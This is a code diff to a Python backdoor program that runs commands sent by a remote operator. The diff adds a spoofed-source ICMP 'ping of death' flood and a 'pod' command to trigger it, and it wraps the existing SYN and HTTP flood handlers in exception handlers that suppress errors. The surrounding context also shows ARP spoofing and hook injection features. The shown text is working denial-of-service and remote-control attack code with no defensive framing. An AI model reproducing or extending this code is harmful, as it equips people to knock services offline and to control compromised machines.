@@ -22,7 +22,7 @@ user_agent_list = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'
 ]
-
+garbage = ['c', 'u', 'e', 'n', 'i', 'v', 'd', 'r', '6', 's', '2', 't', '1', 'y', '7']
 
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
@@ -275,8 +275,10 @@ def syn_flooding(port):
         tcp_packet.flags = "S"
         tcp_packet.seq = randomize_integer()
         tcp_packet.window = randomize_integer()
-
-        scapy.send(ip_packet/tcp_packet, verbose=False)
+        try:
+            scapy.send(ip_packet/tcp_packet, verbose=False)
+        except:
+            pass
 
 
 def http_flooding(flood_ip, times):
@@ -285,9 +287,26 @@ def http_flooding(flood_ip, times):
         s.connect((flood_ip, 80))
         s.send("GET / HTTP/1.1\r\n".encode())
         s.send("Host: {}\r\n".format(flood_ip).encode())
-        s.send("User-Agent: {}\r\n\r\n".format(choice(user_agent_list)).encode())
+        s.send("User-Agent: {}\r\n\r\n".format(random.choice(user_agent_list)).encode())
         s.close()
 
+
+def ping_of_death(flood_ip, times):
+    ip_packet = scapy.IP()
+    ip_packet.src = randomize_ip()
+    ip_packet.dst = flood_ip
+
+    icmp_packet = scapy.ICMP()
+    icmp_packet.id = randomize_integer()
+    icmp_packet.seq = randomize_integer()
+
+    payload = random.choice(garbage) * 60000
+
+    for _ in range(times):
+        try:
+            scapy.send(ip_packet/icmp_packet/payload, verbose=False)
+        except:
+            pass
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -391,32 +410,39 @@ class Backdoor:
                                 global hook_process
                                 hook_process = multiprocessing.Process(target=hook)
                                 print("[+] Initializing Hook Injector...")
-                                time.sleep(0.1)
+                                sleep(0.1)
                                 hook_process.start()
                             else:
                                 print('[-] No arp spoof running at the moment.')
                         except NameError:
                             print('[-] No arp spoof running at the moment.')
                     elif command[0] == "synflood":
-                        # try:
-                        global flood_ip
-                        global flood_time
-                        flood_ip = command[1]
-                        flood_ports = list(map(int, command[2].translate({ord(i): None for i in '[]'}).split(',')))
-                        flood_time = int(command[3])
-                        pool = multiprocessing.Pool(processes=len(flood_ports))
-                        pool.map(syn_flooding, flood_ports)
-                        pool.close()
-                        pool.join()
-                        # except:
-                        #     pass
+                        try:
+                            global flood_ip
+                            global flood_time
+                            flood_ip = command[1]
+                            flood_ports = list(map(int, command[2].translate({ord(i): None for i in '[]'}).split(',')))
+                            flood_time = int(command[3])
+                            pool = multiprocessing.Pool(processes=len(flood_ports))
+                            pool.map(syn_flooding, flood_ports)
+                            pool.close()
+                            pool.join()
+                        except:
+                            pass
                     elif command[0] == "httpflood":
-                        # try:
-                        flood_ip = command[1]
-                        flood_time = int(command[2])
-                        http_flooding(flood_ip, flood_time)
-                        # except:
-                        #     pass
+                        try:
+                            flood_ip = command[1]
+                            flood_time = int(command[2])
+                            http_flooding(flood_ip, flood_time)
+                        except:
+                            pass
+                    elif command[0] == "pod":
+                        try:
+                            flood_ip = command[1]
+                            flood_time = int(command[2])
+                            ping_of_death(flood_ip, flood_time)
+                        except:
+                            pass
                     elif command[0] == "killarp":
                         try:
                             kill_arp()
